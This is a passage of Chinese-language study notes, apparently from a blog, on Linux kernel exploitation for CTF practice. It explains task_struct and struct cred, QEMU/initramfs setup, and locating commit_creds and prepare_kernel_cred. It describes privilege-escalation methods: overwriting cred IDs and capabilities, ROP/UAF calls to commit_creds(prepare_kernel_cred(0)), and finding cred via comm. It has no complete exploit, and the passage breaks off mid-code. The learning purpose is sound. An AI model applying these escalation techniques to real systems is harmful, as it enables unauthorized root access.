指向文件系统信息的指针，如当前工作目录(pwd)和根目录。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 7. 信号处理 (Signal Handling)</span></span><br><span class="line"><span class="comment">     * &quot;我该如何响应信号？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span>;</span>   <span class="comment">/* 指向信号描述符的指针，由线程组共享。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> *<span class="title">sighand</span>;</span> <span class="comment">/* 指向信号处理函数的指针，也由线程组共享。*/</span></span><br><span class="line">    <span class="type">sigset_t</span> blocked;               <span class="comment">/* 此线程阻塞的信号掩码 (per-thread) */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... 以及其他成百上千用于不同子系统（如 cgroups, namespaces, tracing 等）的字段 ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="如何在内核中找到当前的-task-struct？"><a href="#如何在内核中找到当前的-task-struct？" class="headerlink" title="如何在内核中找到当前的 task_struct？"></a>如何在内核中找到当前的 <code>task_struct</code>？</h3><p>你不可能去遍历所有内存来找这个结构体。内核提供了一个极其高效的宏：</p>
<p><code>current</code></p>
<p>在内核代码的任何地方，<code>current</code> 宏都会返回一个指向<strong>当前正在 CPU 上运行的进程</strong>的 <code>task_struct</code> 的指针。</p>
<p>例如，一个系统调用的代码可能是这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE0(getuid)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* current 指向调用 getuid() 的那个进程的 task_struct */</span></span><br><span class="line">    <span class="keyword">return</span> current-&gt;cred-&gt;uid.val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>current</code> 的实现非常巧妙，通常是通过读取当前 CPU 的栈指针，然后进行对齐计算得到的，速度极快。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>task_struct</code> 是内核数据结构的中心枢纽。它通过一系列的指针，将进程的状态、调度、内存、文件、凭证、信号等所有方面的信息全部组织和链接起来，形成了一个完整而复杂的管理体系。</p>
<p>对于 Pwn 学习者来说，理解以下几个指针指向的结构体尤为重要：</p>
<ul>
<li><strong><code>cred</code></strong>: 提权的核心目标。</li>
<li><strong><code>mm</code></strong>: 理解进程虚拟内存布局，为用户态 Pwn 和内核利用打下基础。</li>
<li><strong><code>files</code></strong>: 在一些利用场景中，可能需要操作文件描述符表（如重定向）。</li>
</ul>
<h2 id="关于slab原理源码级剖析"><a href="#关于slab原理源码级剖析" class="headerlink" title="关于slab原理源码级剖析"></a>关于slab原理源码级剖析</h2><p><a href="https://www.cnblogs.com/binlovetech/p/17434311.html">参考文章</a></p>
<h2 id="关于cred结构体"><a href="#关于cred结构体" class="headerlink" title="关于cred结构体"></a>关于cred结构体</h2><p>好的，这是一个非常核心的内核数据结构。<code>struct cred</code> 定义了进程执行操作时所拥有的所有凭证和权限。它的具体内容会随着内核版本的演进略有变化，这里提供一个基于较新内核版本（例如 5.x 或 6.x）的完整结构体定义，并对关键字段进行详细解释。</p>
<p>这个结构体定义通常位于内核源码的 <code>include/linux/cred.h</code> 文件中。</p>
<h3 id="struct-cred-完整定义"><a href="#struct-cred-完整定义" class="headerlink" title="struct cred 完整定义"></a><code>struct cred</code> 完整定义</h3><p><img data-src="/../images/image-20250726162206089.png" alt="image-20250726162206089"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The &#x27;struct cred&#x27; is a reference-counted structure that contains all of</span></span><br><span class="line"><span class="comment"> * the security-relevant information for a task. A pointer to this structure</span></span><br><span class="line"><span class="comment"> * is stored in the task_struct.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that this structure is copied on fork.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;          <span class="comment">// 引用计数，记录有多少个进程在使用这个cred结构体</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">// For debugging purposes</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;            <span class="comment">// 真实用户ID (UID)</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;            <span class="comment">// 真实组ID (GID)</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;           <span class="comment">// 保存的设置用户ID (Saved Set-User-ID)</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;           <span class="comment">// 保存的设置组ID (Saved Set-Group-ID)</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;           <span class="comment">// 有效用户ID (Effective UID) - 内核主要依据此ID进行权限检查</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;           <span class="comment">// 有效组ID (Effective GID) - 内核主要依据此ID进行权限检查</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;          <span class="comment">// 文件系统用户ID (Filesystem UID)</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;          <span class="comment">// 文件系统组ID (Filesystem GID)</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits;     <span class="comment">// 安全位 (securebits)</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">// 可继承的能力集</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;   <span class="comment">// 许可的能力集 (能力的上限)</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;   <span class="comment">// 有效的能力集 (当前实际生效的能力)</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;        <span class="comment">// 能力边界集 (Bounding set)</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;     <span class="comment">// 环境能力集 (Ambient set)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>      *<span class="title">session_keyring</span>;</span> <span class="comment">// 会话密钥环</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>      *<span class="title">process_keyring</span>;</span> <span class="comment">// 进程密钥环</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>      *<span class="title">thread_keyring</span>;</span>  <span class="comment">// 线程密钥环</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>      *<span class="title">reqkey_auth_key</span>;</span> <span class="comment">// 请求密钥的认证密钥</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>            *security;      <span class="comment">// 指向安全模块(如SELinux, AppArmor)特定数据的指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>       <span class="comment">// 指向与此用户相关的user_struct，用于追踪进程数等</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">// 指向用户命名空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">// 包含补充组ID列表的指针</span></span><br><span class="line">    <span class="comment">/* RCU deletion */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>            <span class="comment">// RCU（读-拷贝-更新）机制使用的头部，用于安全地延迟释放</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="关键字段详细解析"><a href="#关键字段详细解析" class="headerlink" title="关键字段详细解析"></a>关键字段详细解析</h3><ol>
<li><p><strong><code>usage</code> (atomic_t)</strong></p>
<ul>
<li><strong>作用</strong>：引用计数器。因为多个进程可能共享同一个 <code>cred</code> 结构体（例如，在 <code>clone</code> 系统调用时），这个字段记录了共享者的数量。当 <code>usage</code> 减到0时，这个结构体占用的内存才会被真正释放。这是防止UAF漏洞的重要机制。</li>
</ul>
</li>
<li><p><strong>用户和组ID (UIDs &amp; GIDs)</strong></p>
<ul>
<li><strong><code>uid</code> &#x2F; <code>gid</code> (真实ID)</strong>：标识进程的真正所有者。通常只有root进程（或拥有<code>CAP_SETUID</code>能力的进程）才能改变它们。</li>
<li><strong><code>euid</code> &#x2F; <code>egid</code> (有效ID)</strong>：<strong>这是进行权限检查时最重要的ID</strong>。例如，当访问一个文件时，内核会比较进程的 <code>euid</code> 和 <code>egid</code> 与文件的所有者信息来决定访问权限。<code>setuid</code> 程序的核心就是改变 <code>euid</code>。</li>
<li><strong><code>suid</code> &#x2F; <code>sgid</code> (保存的ID)</strong>：当一个进程通过 <code>execve</code> 执行一个 <code>setuid</code> 程序时，它原来的 <code>euid</code> 会被保存到 <code>suid</code> 中。这使得进程可以在需要时恢复回原来的权限。</li>
<li><strong><code>fsuid</code> &#x2F; <code>fsgid</code> (文件系统ID)</strong>：专门用于文件系统相关的权限检查。在大多数情况下，它们与 <code>euid</code>&#x2F;<code>egid</code> 相同，但在某些特殊场景（如NFS服务）下可能会不同。</li>
</ul>
</li>
<li><p><strong>能力 (Capabilities)</strong></p>
<ul>
<li>在现代Linux系统中，传统的将所有特权赋予root用户的模式被打破了。<strong>能力 (Capabilities)</strong> 将root用户的特权分割成一组组离散的单元。一个进程可以只被授予它完成任务所必需的特定能力，而不是全部的root权限。</li>
<li><strong><code>cap_permitted</code> (许可集)</strong>：定义了该进程<strong>可能</strong>拥有的能力的上限。即使通过某种方式获得了某个能力，如果它不在许可集中，也无法生效。</li>
<li><strong><code>cap_effective</code> (有效集)</strong>：<strong>这是内核进行特权操作检查时实际使用的能力集</strong>。它必须是 <code>cap_permitted</code> 的一个子集。</li>
<li><strong><code>cap_inheritable</code> (继承集)</strong>：当执行 <code>execve</code> 时，这个集合中的能力可以被传递给新程序。</li>
<li><strong><code>cap_bset</code> (边界集)</strong>：系统范围内的能力上限，任何进程的能力都不能超过这个边界。</li>
<li><strong><code>cap_ambient</code> (环境集)</strong>：一种让非 <code>setuid</code> 程序也能继承能力的方式，解决了传统能力继承机制的一些问题。</li>
</ul>
</li>
<li><p><strong>安全模块 (Security Module)</strong></p>
<ul>
<li><strong><code>security</code> (void *)</strong>：这是一个非常重要的扩展点。它是一个指针，指向由当前系统启用的Linux安全模块（LSM），如 <strong>SELinux</strong> 或 <strong>AppArmor</strong>，所使用的私有数据。内核在进行权限检查时，除了检查传统的UID&#x2F;GID和能力，还会调用LSM提供的钩子函数，通过这个 <code>security</code> 指针来获取额外的安全上下文，进行强制访问控制（MAC）。</li>
</ul>
</li>
<li><p><strong>密钥环 (Keyrings)</strong></p>
<ul>
<li><strong><code>session_keyring</code>, <code>process_keyring</code> 等</strong>：指向内核密钥管理服务的不同密钥环。用于安全地存储加密密钥、认证令牌等敏感信息。</li>
</ul>
</li>
</ol>
<h3 id="在Pwn中的意义"><a href="#在Pwn中的意义" class="headerlink" title="在Pwn中的意义"></a>在Pwn中的意义</h3><p>对于内核漏洞利用（Pwn）来说，<code>struct cred</code> 是<strong>最终极的目标</strong>。只要能获得向内核任意地址写入数据的能力（Arbitrary Write），攻击者就会构造一个 <code>cred</code> 结构体的镜像，将其所有关键字段都设置为0或最高权限，然后用这个构造好的数据覆盖掉当前进程在内核中的 <code>cred</code> 结构体。</p>
<ul>
<li>将 <code>uid</code>, <code>gid</code>, <code>euid</code>, <code>egid</code> 等全部置为 <code>0</code>。</li>
<li>将所有的 <code>capability</code> 集合（<code>cap_permitted</code>, <code>cap_effective</code> 等）全部置为 <code>0xffffffffffffffff</code>（即启用所有能力）。</li>
</ul>
<p>一旦覆盖成功，当前进程就瞬间从一个普通用户进程变成了拥有所有权限的root进程，从而达到提权的目的。</p>
<h2 id="关于pwn"><a href="#关于pwn" class="headerlink" title="关于pwn"></a>关于pwn</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><ol>
<li>查看装载驱动 <code>lsmod</code></li>
<li>查看所开保护 <code>cat /proc/cpuinfo</code></li>
<li>查看内核链块 <code>cat /proc/slabinfo</code></li>
<li>查看内核函数地址<ul>
<li><code>grep prepare_kernel_cred /proc/kallsysms</code></li>
<li><code>grep commit_creds /proc/kallsysms</code></li>
</ul>
</li>
</ol>
<h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>通过rop,uaf等实现这个函数<strong>commit_creds(prepare_kernel_cred(0))，然后返回到用户层面就可以提权成功</strong></p>
<img data-src="../images/image-20250721110324733.png" alt="image-20250721110324733" style="zoom:67%;" />

<ol>
<li>修改startvm.sh，加入gdb调试的选项，方便后面调试，就是startvm.sh脚本中加一个<code>-s</code>即可</li>
</ol>
<p>如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stty intr ^]</span></span><br><span class="line"><span class="comment">#cd `dirname $0`</span></span><br><span class="line"><span class="built_in">timeout</span> --foreground 0 qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,+smap,+smep 2&gt;/dev/null \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>针对 initramfs.cpio 进行解包和打包，方便之后修改</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> core</span><br><span class="line"><span class="built_in">cd</span> core</span><br><span class="line">cpio -idm &lt; ../initramfs.cpio</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; ../initramfs.cpio</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>修改 initramfs.cpio 的启动脚本 init，方便之后从root身份启动，查看一些信息</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/babyhacker.ko</span><br><span class="line"><span class="built_in">chmod</span> 644 /dev/babyhacker</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/pwn</span><br><span class="line"><span class="built_in">chown</span> -R root /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R 1000:1000 .</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>启动后并且查看装载驱动（使用lsmod命令）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~ $ lsmod</span><br><span class="line">babyhacker 2104 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">~ $ <span class="built_in">id</span></span><br><span class="line">uid=1000(pwn) gid=1000 <span class="built_in">groups</span>=1000</span><br><span class="line">~ $</span><br></pre></td></tr></table></figure>

<p>查看相关提权函数 commit_creds 和 prepare_kernel_cred</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~ $ <span class="built_in">cat</span> /proc/kallsyms | grep commit_creds</span><br><span class="line">ffffffff810a1430 T commit_creds</span><br><span class="line">ffffffff81d73ac0 R __ksymtab_commit_creds</span><br><span class="line">ffffffff81d939e4 r __kstrtab_commit_creds</span><br><span class="line">~ $ <span class="built_in">cat</span> /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff810a1820 T prepare_kernel_cred</span><br><span class="line">ffffffff81d7c5b0 R __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff81d939a8 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure>

<h3 id="常见内核保护"><a href="#常见内核保护" class="headerlink" title="常见内核保护"></a>常见内核保护</h3><ol>
<li>Kaslr 地址随机化 在startvm.sh 中，一般本地调试时，改为nokaslr</li>
<li>Smep 内核态不可<strong>执行</strong>用户态代码 root.sh启动 cat &#x2F;proc&#x2F;cpuinfo</li>
<li>Smap 内核态不可<strong>访问</strong>用户态内存 root.sh 启动 cat &#x2F;proc&#x2F;cpuinfo</li>
</ol>
<blockquote>
<p>常见内核漏洞</p>
<ol>
<li>栈溢出</li>
<li>uaf漏洞</li>
<li>double fetch漏洞</li>
<li>其它漏洞，如逻辑漏洞等</li>
</ol>
</blockquote>
<p><img data-src="/../images/image-20250721113403783.png" alt="image-20250721113403783"></p>
<p><strong>进入kernel态之前会做什么？</strong></p>
<p>保存用户态的各个寄存器，以及执行到代码的位置</p>
<p><strong>从kernel态返回用户态需要做什么？</strong></p>
<p>执行 swapgs 和 iret 指令，当然前提是栈上需要布置好恢复的寄存器的值</p>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol>
<li>解包<code>rootfs</code>,检查保护</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> File_system</span><br><span class="line">$ <span class="built_in">mv</span> rootfs.cpio ./File_system/rootfs.cpio.gz</span><br><span class="line">$ <span class="built_in">cd</span> File_system</span><br><span class="line">$ gunzip rootfs.cpio.gz</span><br><span class="line">$ cpio -idmv &lt; rootfs.cpio</span><br><span class="line"></span><br><span class="line">$ file babydriver.ko </span><br><span class="line">$ checksec --file=babydriver.ko</span><br></pre></td></tr></table></figure>

<p>2.拖进<code>IDA</code>在内核代码中找到漏洞</p>
<p>3.利用<code>Shellcode</code>, <code>ROP</code>, 等攻击方式实现代码执行</p>
<p>4.提权</p>
<p>5.本地写好 <code>exploit</code> 后，可以通过 <code>base64</code> 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到<code> flag</code>，同时可以使用 <code>musl</code>, <code>uclibc</code> 等方法减小 <code>exploit</code> 的体积方便传输</p>
<p>测试<code>exp</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> ./exp ./fs &amp;&amp; <span class="built_in">cd</span> fs</span><br><span class="line">$ find . | cpio -o --format=newc &gt; ../rootfs.cpio <span class="comment"># 重新打包文件系统</span></span><br><span class="line">$ ./boot.sh <span class="comment"># 启动&amp;测试exp</span></span><br></pre></td></tr></table></figure>

<h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br></pre></td></tr></table></figure>

<p><code>ioctl</code>也是一个系统调用，用于与设备通信</p>
<p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (<code>open</code>) 返回的文件描述符，第二个参数为用户程序对设备的<strong>控制命令</strong>，再后边的参数则是一些补充参数，与设备有关</p>
<blockquote>
<p>内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。对设备驱动的请求是一个以设备和请求号码为参数的 <code>ioctl</code> 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用</p>
</blockquote>
<h3 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h3><p>可加载核心模块 (或直接称为内核模块) ,是内核空间的可执行程序，包括<strong>驱动程序（设备驱动、文件系统驱动）和内核扩展模块</strong>,和用户态的可执行程序相同，<code>Linux</code> 下为 <code>ELF</code>，<code>Windows</code> 下为 <code>exe/dll</code>，<code>mac</code> 下为 <code>MACH-O</code></p>
<p><strong>模块</strong>可以被单独编译，但不能单独运行，运行时<strong>被链接到内核</strong>作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同</p>
<blockquote>
<p><code>Linux</code> 内核之所以提供模块机制，是因为它本身是一个单内核 (<code>monolithic kernel</code>)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
</blockquote>
<h4 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h4><ul>
<li><strong>insmod</strong>: 将指定<strong>模块加载到内核</strong>中</li>
<li><strong>rmmod</strong>: 从内核中<strong>卸载指定模块</strong></li>
<li><strong>lsmod</strong>: <strong>列出</strong>已经加载的模块</li>
<li><strong>modprobe</strong>: <strong>添加或删除</strong>模块，加载模块时会查找依赖关系</li>
</ul>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>即获取到 <code>root</code> 权限</p>
<h4 id="改变自身"><a href="#改变自身" class="headerlink" title="改变自身"></a>改变自身</h4><p>通过改变自身进程的权限，使其具有 root 权限,内核会通过进程的 <code>task_struct</code> 结构体中的 <code>cred</code> 指针来索引 <code>cred</code> 结构体，<code>cred</code>结构体成员中的 <code>uid-fsgid</code> 都为 <code>0</code>则具有 <code>root </code>权限,这种提权方法分为定位和修改两个步骤，<code>cred</code>结构体在<code>include/linux/cred.h</code></p>
<h5 id="直接改cred结构体的内容"><a href="#直接改cred结构体的内容" class="headerlink" title="直接改cred结构体的内容"></a>直接改cred结构体的内容</h5><h6 id="定位cred具体位置"><a href="#定位cred具体位置" class="headerlink" title="定位cred具体位置"></a>定位cred具体位置</h6><ul>
<li><p>直接定位</p>
<p><code>cred</code> 结构体的最前面记录了各种<code> id</code> 信息，对于一个普通的进程而言，<code>uid-fsgid</code> 都是执行进程的用户的身份,因此可以通过<strong>扫描内存</strong>来定位 <code>cred</code></p>
<p>**在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。**可以利用 <code>usage</code> 不为 <code>0</code> 来筛除掉一些 <code>cred</code>，但仍然会发现一些 <code>usage</code> 为 <code>0</code> 的 <code>cred</code>,这是因为 <code>cred</code> 从 <code>usage</code> 为 <code>0</code>， 到释放有一定的时间,此外，<code>cred</code> 是使用 <code>rcu</code> <strong>延迟释放</strong>的</p>
</li>
<li><p>间接定位</p>
<ul>
<li><p><code>task_struct</code></p>
<p>进程的 <code>task_struct</code> 结构体中会存放指向 <code>cred</code> 的指针，因此我们可以</p>
<ol>
<li>定位当前进程 <code>task_struct</code> 结构体的地址</li>
<li>根据<code> cred</code> 指针相对于 <code>task_struct</code> 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li>
<li>获取 <code>cred</code> 具体的地址</li>
</ol>
</li>
<li><p><code>comm</code></p>
<p><code>comm </code>用来标记可执行<strong>文件的名字</strong>，位于进程的 <code>task_struct</code> 结构体中, <code>comm</code> 在 <code>cred</code> 的正下方，所以可以先定位 <code>comm </code>，然后定位 <code>cred</code> 的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>

<p>进程名字并不特殊的情况下可能会有多个同样的字符串，,可以使用 <code>prctl</code> 设置进程的<code>comm</code>为一个特殊的字符串，然后再开始定位 <code>comm</code></p>
</li>
</ul>
</li>
<li><p>修改</p>
<p>直接将 <code>cred</code> 中的 <code>uid-fsgid</code> 都修改为 <code>0</code>,当然修改的方式有很多种</p>
<ul>
<li>在我们具有任意地址读写后，可以直接修改 <code>cred</code></li>
<li>在我们可以 <code>ROP</code> 执行代码后，可以利用 <code>ROP gadget</code> 修改 <code>cred</code></li>
</ul>
</li>
</ul>
<h6 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h6><p>不一定非得知道 <code>cred</code> 的具体位置，只需要能够修改 <code>cred</code> 即可</p>
<p><strong>UAF 使用同样堆块-过时</strong></p>
<p>如果我们在进程初始化时能控制 <code>cred</code> 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的,且不需要任何信息泄露，例子:</p>
<ol>
<li>申请一块与 <code>cred</code> 结构体大小一样的堆块</li>
<li>释放该堆块</li>
<li><code>fork</code> 出新进程，恰好使用刚刚释放的堆块</li>
<li>修改 <code>cred</code> 结构体特定内存，从而提权</li>
</ol>
<p><strong>此种方法在较新版本内核中已不再可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 <code>cred_jar</code> 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="修改-task-struct-结构体中的-cred-指针"><a href="#修改-task-struct-结构体中的-cred-指针" class="headerlink" title="修改 task_struct 结构体中的 cred 指针"></a>修改 task_struct 结构体中的 cred 指针</h5><h6 id="定位cred结构体指针具体位置"><a href="#定位cred结构体指针具体位置" class="headerlink" title="定位cred结构体指针具体位置"></a>定位cred结构体指针具体位置</h6><ul>
<li><p>间接定位</p>
<ul>
<li><p><code>task_struct</code></p>
<p><code>task_struct</code> 结构体中会存放指向 <code>cred</code> 的指针，可以定位<code>task_struct</code> 结构体的地址,再根据 <code>cred</code> 指针的偏移计算得出 <code>cred</code> 指针地址</p>
</li>
<li><p><code>comm</code></p>
<p>在<code>cred</code>指针正下方，可以使用 <code>prctl</code> 设置进程的 <code>comm</code> 为一个特殊的字符串，然后再定位 <code>comm</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">char</span>                